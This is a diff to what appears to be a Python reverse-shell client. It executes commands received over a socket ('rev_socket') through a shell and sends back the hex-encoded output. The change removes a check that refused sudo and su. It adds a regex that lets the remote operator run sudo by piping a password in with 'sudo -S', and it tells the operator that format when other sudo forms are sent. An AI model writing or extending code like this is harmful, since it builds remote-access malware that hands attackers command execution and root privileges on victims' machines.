@@ -11,10 +11,13 @@ import codecs
 import json
 import platform
 import getpass
+import re
 
 BLUE = '\033[94m'
 GREEN = '\033[92m'
 NORMAL = '\033[0m'
+
+sudo_regex = re.compile(r'echo .* \| sudo (\-\-stdin|\-S) .*')
 
 def hex_handler(text, encode=False, decode=False):
     '''Encode or decode text using hex.'''
@@ -50,10 +53,6 @@ while True:
     except json.decoder.JSONDecodeError:
         continue
 
-    if 'sudo' in command or 'su' in command:
-        rev_socket.send(hex_handler('sudo and su are not supported.', encode=True))
-        continue
-
     if command == 'exit':
         rev_socket.close()
         break
@@ -74,6 +73,13 @@ while True:
     if command.startswith('background_exec') and len(command.split()) >= 2:
         background_exec = subprocess.Popen(command[15:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         rev_socket.send(hex_handler('\n', encode=True))
+        continue
+
+    if 'sudo' in command and not sudo_regex.search(command):
+        rev_socket.send(hex_handler('Use sudo in the format echo PASSWORD | sudo -S COMMAND.', encode=True))
+        continue
+    if 'su' in command.split():
+        rev_socket.send(hex_handler('su is not supported.', encode=True))
         continue
 
     output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
